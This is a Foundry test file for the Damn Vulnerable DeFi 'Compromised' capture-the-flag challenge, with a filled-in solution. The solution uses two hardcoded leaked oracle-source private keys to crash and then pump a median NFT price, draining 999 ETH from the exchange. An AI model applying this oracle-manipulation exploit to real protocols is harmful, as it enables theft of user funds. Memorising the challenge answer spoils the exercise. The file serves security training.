// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * SOLUTION (BlockTack corpus reproduction, BTV-L2-003)
     * The README's leaked hex blobs decode (hex -> base64) to the private keys of two of the
     * oracle's three trusted sources. With two sources controlled, the attacker controls the
     * median price: crash DVNFT to 0, buy an NFT for 1 wei, pump the price to 999 ETH, sell
     * the NFT back to drain the exchange, then forward the funds to the recovery account.
     */
    function test_poc_compromised() public checkSolved {
        // Leaked private keys (decoded from the HTTP response snippet in src/compromised/README.md)
        uint256 sourceKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744; // 0x188...088
        uint256 sourceKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159; // 0xA41...9D8

        // 1) Crash the median DVNFT price to 0 using the two compromised sources
        vm.startPrank(vm.addr(sourceKey1));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(vm.addr(sourceKey2));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        // 2) Player buys an NFT for almost nothing (only needs msg.value > 0)
        vm.startPrank(player);
        uint256 tokenId = exchange.buyOne{value: 1 wei}();

        // 3) Pump the median DVNFT price to the exchange's entire balance
        vm.stopPrank();
        vm.startPrank(vm.addr(sourceKey1));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
        vm.startPrank(vm.addr(sourceKey2));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // 4) Player sells the NFT back, draining all ETH from the exchange
        vm.startPrank(player);
        nft.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);

        // 5) Forward the rescued funds to the recovery account.
        //    Prices were restored to 999 ETH, so the median-price invariant holds.
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
